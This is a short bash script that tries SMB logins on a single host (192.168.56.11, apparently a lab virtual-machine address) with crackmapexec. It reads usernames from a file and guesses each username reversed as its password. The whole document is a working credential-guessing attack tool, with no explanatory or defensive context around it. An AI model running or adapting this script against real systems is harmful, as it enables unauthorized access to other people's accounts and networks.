#!/bin/bash

# Target IP
TARGET_IP="192.168.56.11"

# Read usernames from a file
USERNAMES=$(cat usernames.txt)

# Function to reverse a string
reverse_string() {
    echo "$1" | rev
}

# Loop through each username
for USER in $USERNAMES; do
    REVERSED_PASS=$(reverse_string "$USER")
    echo "Trying $USER:$REVERSED_PASS ..."
    crackmapexec smb $TARGET_IP -u "$USER" -p "$REVERSED_PASS"
done
